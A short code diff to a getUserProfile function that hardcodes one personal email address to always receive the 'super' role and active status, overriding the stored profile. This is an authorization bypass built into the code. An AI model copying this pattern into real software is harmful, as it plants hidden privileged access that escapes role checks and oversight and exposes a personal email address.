@@ -53,8 +53,8 @@ export async function getUserProfile() {
     return {
         id: user.id,
         email: user.email,
-        role: perfil?.role || 'normal',
-        status: perfil?.status || 'ativo'
+        role: (user.email === 'hneemias.barbosa@gmail.com' ? 'super' : (perfil?.role || 'normal')),
+        status: (user.email === 'hneemias.barbosa@gmail.com' ? 'ativo' : (perfil?.status || 'ativo'))
     }
 }
 
